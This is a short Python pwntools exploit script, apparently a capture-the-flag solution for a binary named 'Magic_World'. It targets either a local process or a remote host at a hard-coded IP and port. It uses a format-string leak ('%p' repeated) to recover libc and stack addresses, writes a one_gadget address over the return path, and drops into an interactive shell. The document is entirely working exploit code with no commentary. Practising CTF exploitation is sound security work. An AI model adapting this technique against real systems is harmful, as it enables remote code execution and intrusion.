from pwn import *
import sys

context.arch = 'x86_64'

if len(sys.argv) > 1:
    r = remote('104.199.235.135', 2114)
else:
    r = process('./Magic_World')


def regist(ctx):
    r.sendlineafter(':', '1')
    r.sendafter(':', ctx)


def magic(ctx):
    r.sendlineafter(':', '2')
    r.sendafter(':', ctx)

one_gadget = 0x4526a
libc_start = 0x20740 + 240
regist('%p '*0x20)
resp = r.recvuntil('\n').split(' ')
libc = int(resp[25], 0) - libc_start
stack = int(resp[20], 0) - 0x30
log.info( "libc: "+ hex(libc))
log.info( "stack: "+ hex(stack))

magic('A'*8 + p64(libc + one_gadget) + chr(stack & 0xff))



r.interactive()
